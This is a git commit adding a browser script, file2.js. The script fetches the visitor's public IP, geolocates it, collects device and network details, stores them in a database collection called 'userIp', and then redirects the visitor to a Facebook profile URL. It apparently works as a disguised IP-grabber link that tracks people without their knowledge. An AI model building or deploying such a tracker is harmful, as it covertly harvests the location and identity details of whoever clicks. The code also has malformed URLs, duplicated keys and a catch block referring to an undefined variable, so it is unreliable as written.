55efe7cc5f351f119e55fd33aac6158fbefd26b7
MD. Shahadat Hossain Shaon <91417960+Shahadatshaon@users.noreply.github.com>
2023-04-13 10:44:28 +0600

    Add files via upload

---
+++ file2.js
@@ -0,0 +1,50 @@
+fetch('https:api.ipify.org/?format=json') 
+.then(response => response.json()) 
+.then(data => { 
+const ipAddress = data.ip; 
+
+
+fetch(`https:api.iplocation.net/?ip=${ipAddress}`) 
+.then(response => response.json()) 
+.then(data => { 
+
+const geoBasicInfo = { 
+ip_number: data.ip_number, 
+ip_version: data.ip_version, 
+country_name: data.country_name, 
+country_code2: data.country_code2, 
+isp: data.isp, 
+} 
+
+ const deviceInfo = { 
+ userAgent: navigator.userAgent, 
+ language: navigator.language, 
+ platform: navigator.platform, 
+ screenWidth: window.screen.width, 
+ screenHeight: window.screen.height, 
+ networkeffectiveType: navigator.connection.effectiveType, 
+ networkdownlink: navigator.connection.downlink, 
+ }; 
+
+ console.log(deviceInfo); 
+
+db.collection("userIp").add({ 
+ipAddress, time: new Date(), geoBasicInfo, 
+ipAddress, deviceInfo, geoBasicInfo, time: new Date(), 
+})
+.then(_ => { 
+window.location.replace("http:www.facebook.com/profile.php?") 
+}); 
+}) 
+.catch(error => 
+    { console.error(error); 
+    }); 
+   
+       
+
+ }) 
+ .catch(err => 
+     { console.error(error); 
+     }); 
+     
+
